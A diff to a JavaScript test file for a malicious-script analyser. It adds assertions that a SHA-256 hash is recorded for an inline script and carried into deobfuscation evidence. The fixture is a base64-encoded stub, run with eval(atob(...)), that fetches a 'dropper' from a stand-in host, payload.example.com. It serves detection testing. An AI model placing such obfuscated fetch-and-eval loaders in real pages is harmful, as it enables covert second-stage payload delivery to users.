@@ -30,6 +30,8 @@ assert.equal(extractThreatAssociations('Article title: Vidar (26) woke up with a
 const encoded = Buffer.from('fetch("https://payload.example.com/dropper"); document.write("stage");').toString('base64')
 const script = inspectScript({ src: '', inline: `eval(atob("${encoded}"));` }, 0)
 const task = summarizeDeobfuscationTask(script)
+assert.match(script.sha256, /^[a-f0-9]{64}$/, 'records a script SHA-256 for analyst evidence')
+assert.equal(task.sha256, script.sha256, 'carries script SHA-256 into WebCrack/deobfuscation evidence')
 assert.equal(task.assessment, 'suspicious')
 assert(task.decodedTransforms.includes('base64 string'), 'records base64 decoding')
 assert(task.indicators.domains.includes('payload.example.com'), 'decoded indicators include second-stage domain')
